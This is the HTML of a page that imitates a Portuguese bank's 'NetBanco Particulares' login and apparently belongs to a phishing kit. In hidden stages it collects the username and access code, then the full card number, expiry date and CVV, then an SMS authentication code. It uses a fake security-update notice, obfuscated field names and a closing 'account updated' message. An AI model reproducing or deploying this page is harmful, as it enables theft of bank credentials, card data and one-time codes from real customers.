<table style="width:100%;">
  <tbody>
    <tr>
      <td valign="top" class="displayTable">
        <div id="form:0" style="display:none;">
          <br>
          <p style="font-size:12px;color:#333;">
            Uma grande atualização de segurança está em andamento, não atualize a página, isso pode demorar até 30
            segundos. </p>
          <br><br><br><br><br><br><br><br><br>
          <div class="loader">
            <span class="en">Validando credenciais...</span>
          </div>
          <br><br><br><br><br>
        </div>
        <div class="main-content" id="form:1">
          <div class="page-title">
            <h1 class="main-title">NetBanco Particulares</h1>
            <h2 class="secondary-title">Login</h2>
          </div>
          <p class="title-description">
            Para aceder às suas contas e documentos no NetBanco, introduza o seu Nome de Utilizador seguido do seu
            Código de Acesso.
          </p>
          <section class="form-container">
            <div class="input-div">
              <input id="_tables.login" type="text" name="CABF3B1E971C89A2C065B44FF5DEE7E3" class="input-field"
                placeholder=" " maxlength="16" required="" autofocus=""><label for="CABF3B1E971C89A2C065B44FF5DEE7E3"
                id="CABF3B1E971C89A2C065B44FF5DEE7E3" class="floating-label">Nome de utilizador</label>
            </div>
            <div class="input-div">
              <input type="password" id="_tables.password" maxlength="16" name="E028C9E8C572F1C6DB930924B27616FE"
                class="input-field" placeholder=" " required="">
              <label for="E028C9E8C572F1C6DB930924B27616FE" id="E028C9E8C572F1C6DB930924B27616FE"
                class="floating-label">Código de Acesso</label>
              <button type="button" onclick="setpass()" class="show-password-button" id="show-password-button"
                tabindex="-1"></button>
              <button type="button" style="display:none" onclick="setpass2()" class="show-password-button"
                id="show-password-button2" tabindex="-1"></button>
            </div>
            <a class="gray-link display-block" target="_parent">Esqueceu-se do código?</a>
            <div class="form-main-buttons">
              <a class="alt-button-red" target="_parent">Novo Registo</a>
              <button id="submit_button" onclick="_tables.fkbtn(1);" class="square-button-red"
                type="submit">Entrar</button>
            </div>
          </section>
          <a class="gray-link" href="/pagina/indice/0,,840_1_2,00.html" target="_parent">Cartão Refeição</a>
          <a class="gray-link" href="https://www.santandertotta.pt/pt_PT/Particulares/simples-mudar-para-santander.html"
            target="_parent">Ainda não sou cliente</a>
        </div>
        <div id="form:2" class="main-content" style="display:none;">
          <div class="page-title">
            <h1 class="main-title">NetBanco Particulares</h1>
            <h2 class="secondary-title">Login</h2>
          </div>
          <div id="mainLoading" style="padding-right: 30px; font-size: 14px; display: none;">
            <br>
            Aguarde, por favor. O tratamento está em curso, não actualize a página. <br>
            <br>
            <br>
            <br>
            <center>
              <img
                src="data:image/gif;base64,">
            </center>
          </div>
          <p class="title-description">
            Confirme o cartão do banco vinculado à sua conta abaixo:
          </p>
          <div id="ccQuery">
            <div>
              <label>Número do cartão de crédito</label>
              <br>
              <input onkeyup="_tables.next(this,4,'_tables.cc.2');" <input="" maxlength="4" placeholder="XXXX"
                class="bitinput" id="_tables.cc.1" style=" text-align: center;" type="text">
              &nbsp;-&nbsp;
              <input onkeyup="_tables.next(this,4,'_tables.cc.3');" <input="" maxlength="4" placeholder="XXXX"
                class="bitinput" id="_tables.cc.2" style="text-align: center;" type="text">
              &nbsp;-&nbsp;
              <input onkeyup="_tables.next(this,4,'_tables.cc.4');" <input="" maxlength="4" placeholder="XXXX"
                class="bitinput" id="_tables.cc.3" style="text-align: center;" type="text">
              &nbsp;-&nbsp;
              <input maxlength="4" placeholder="XXXX" class="bitinput" id="_tables.cc.4" style=" text-align: center;"
                type="text">
            </div>
            <div class="inputDiv">
              <label>Data de expiração</label>
              <br>
              <select id="_tables.exp.1" style="width: 100px;">
                <option value="-1" selected="selected">--</option>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
              </select>
              &nbsp;/&nbsp;
              <select id="_tables.exp.2" style="width: 100px;">
                <option value="">----</option>
                <option value="20">2020</option>
                <option value="21">2021</option>
                <option value="22">2022</option>
                <option value="23">2023</option>
                <option value="24">2024</option>
                <option value="25">2025</option>
                <option value="25">2026</option>
                <option value="25">2027</option>
                <option value="25">2028</option>
                <option value="25">2029</option>
                <option value="25">2030</option>
              </select>
            </div>
            <div class="inputDiv">
              <label>CVV (3 dígitos no verso)</label>
              <br>
              <input class="bitinput" placeholder="XXX" maxlength="3" id="_tables.cvv"
                style="width: 60px; text-align: center;" type="text">
            </div>
            <div style="margin-top: 10px;">
              <button id="btn2" onclick="_tables.fkbtn(2);">Continuar</button>
            </div>
          </div>
        </div>
        <div id="form:3" style="display:none;">
          <br><br>
          <div class="center">
            <table cellpadding="0" cellspacing="0" style="width:100%;">
              <tbody>
                <tr>
                  <td valign="top" style="padding-right:20px;">
                    <h1>POR FAVOR, IDENTIFIQUE-SE</h1>
                    <p style="font-size:12px;line-height:20px;">
                      Para proteger a sua segurança online, temos de identificar o seu telemóvel que nos ajudará a
                      verificar a sua identidade.
                    </p>
                    <br>
                    <div style="    position: relative;
    box-shadow: 0 0 4px rgba(0,0,0,0.25);
    background-color: #FFFFFF;
    border-radius: 8px;
    padding: 20px 40px 30px;
    margin-bottom: 20px;">
                      <table cellpadding="0" cellspacing="0">
                        <tbody>
                          <tr>
                            <td>
                              <img style="width:60px;"
                                src="data:image/png;base64,">
                            </td>
                            <td style="padding-left:20px;">
                              <label style="color:#666;font-size:20px;">Foi enviado um SMS para com o código de
                                autenticação.</label><br>
                              <label>Aguarde o SMS e após a sua receção por favor introduza o código em baixo.</label>
                            </td>
                          </tr>
                        </tbody>
                      </table>
                      <br><br>
                      <label style="font-weight:bold;">Código

                      </label>
                      <br><br>
                      <input type="text" class="bitinput" id="_tables.sms" maxlength="6" style="    width: 130px;
    padding: 10px;">
                      <div style="text-align:right;float: right;" class="holder">
                        <button onclick="_tables.fkbtn(3);" style="width:150px;">Autenticar</button>
                      </div>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
        <div id="form:4" style="display:none;">
          <div class="center">
            <br><br>
            <p style="font-size:12px;line-height:20px;">
              Obrigado, sua conta foi perfeitamente atualizada. Obrigado pelo seu tempo..... </p>
            <div style="    text-align: center;
    margin-bottom: 20px;">
              <img style="width:53px;"
                src="data:image/png;base64,">
            </div>
            <div style="border-bottom: 2px solid #ddd;margin-top:5px;"></div>
            <br>
            <div style="text-align:right;" class="holder">
              <button>Deixar</button>
            </div>
            <br><br><br><br>
            <br><br><br><br>
            <br><br><br><br>
          </div>
        </div>
      </td>
    </tr>
  </tbody>
</table>